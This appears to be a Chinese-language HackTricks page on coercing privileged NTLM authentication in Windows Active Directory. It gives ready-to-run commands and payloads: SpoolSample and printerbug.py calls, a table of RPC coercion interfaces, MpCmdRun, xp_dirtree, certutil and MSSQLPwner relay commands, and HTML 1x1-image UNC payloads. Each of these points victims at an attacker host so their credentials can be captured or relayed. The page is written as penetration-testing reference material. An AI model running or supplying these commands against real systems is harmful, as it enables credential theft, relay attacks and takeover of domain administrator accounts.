# 强制 NTLM 特权认证

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) 是一个用 C# 编写并使用 MIDL 编译器以避免第三方依赖的远程认证触发器集合。

## Spooler 服务滥用

如果 _**Print Spooler**_ 服务是 **启用** 的，你可以使用一些已知的 AD 凭据向 Domain Controller 的打印服务器 **请求** 有关新打印任务的 **更新**，并指示它把 **通知发送到某个系统**。\
请注意，当打印机将通知发送到任意 **系统** 时，它需要对该 **系统** **进行身份验证**。因此，攻击者可以使 _**Print Spooler**_ 服务对任意系统进行身份验证，且该服务将在此身份验证中 **使用计算机帐户**。

### 在域中查找 Windows 服务器

使用 PowerShell 获取 Windows 主机列表。服务器通常优先，因此我们重点关注服务器：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 查找正在监听的 Spooler Service

使用经过略微修改的 @mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，查看 Spooler Service 是否在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
你也可以在 Linux 上使用 rpcdump.py 并查找 MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 要求服务对任意主机进行身份验证

你可以编译 [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或者在 Linux 上使用 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### 与 Unconstrained Delegation 结合

如果攻击者已经攻陷了一台实现 [Unconstrained Delegation](unconstrained-delegation.md) 的计算机，攻击者可以**使打印机对该计算机进行身份验证**。由于 Unconstrained Delegation，打印机的**计算机账户**的**TGT**会被**保存在**具有 Unconstrained Delegation 的计算机的**内存**中。既然攻击者已经攻陷该主机，他将能够**检索该票证**并滥用它（[Pass the Ticket](pass-the-ticket.md)）。

## RPC 强制认证

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: 这些方法接受可以携带 UNC 路径 的参数（例如 `\\attacker\share`）。在处理时，Windows 会以（计算机/用户 上下文）对该 UNC 进行身份验证，从而使 NetNTLM 捕获或中继成为可能。

### MS-EVEN: ElfrOpenBELW (opnum 9) 强制
- 接口: MS-EVEN 通过 \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- 调用签名: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- 效果: 目标尝试打开所提供的备份日志路径并对攻击者控制的 UNC 进行身份验证。
- 实际用途: 强制 Tier 0 资产（DC/RODC/Citrix 等）发出 NetNTLM，然后中继到 AD CS 端点（ESC8/ESC11 场景）或其他特权服务。

## PrivExchange

`PrivExchange` 攻击源于在 **Exchange Server `PushSubscription` feature** 中发现的一个漏洞。该功能允许任何带邮箱的域用户强制 Exchange server 向任意客户端提供的主机通过 HTTP 进行身份验证。

默认情况下，**Exchange service runs as SYSTEM** 并被赋予过多权限（具体地，pre-2019 Cumulative Update 的域上具有 **WriteDacl** 权限）。此漏洞可被利用来启用向 **LDAP** 的信息中继并随后提取域的 **NTDS** 数据库。在无法中继到 LDAP 的情况下，该漏洞仍可用于中继并向域内的其他主机进行身份验证。成功利用该攻击可以使任何已验证的域用户账户立即获得 **Domain Admin** 访问权限。

## 在 Windows 内部

如果你已经在该 Windows 主机内，你可以用特权账户强制 Windows 连接到服务器，方法包括：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
或者使用这个其他技巧： [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe 这个 lolbin（Microsoft 签名的二进制）来强制 NTLM 认证：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

如果你知道在目标机器上登录的用户的 **email address**，你可以给他发送一封包含 **email with a 1x1 image** 的邮件，例如
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
当他打开它时，他会尝试进行身份验证。

### MitM

如果你能对一台计算机执行 MitM 攻击，并在他将看到的页面中注入 HTML，你可以尝试在页面中注入如下图片:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 强制与钓取 NTLM 身份验证的其他方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## 破解 NTLMv1

如果你能捕获 [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack)。\
_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_

## 参考资料
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
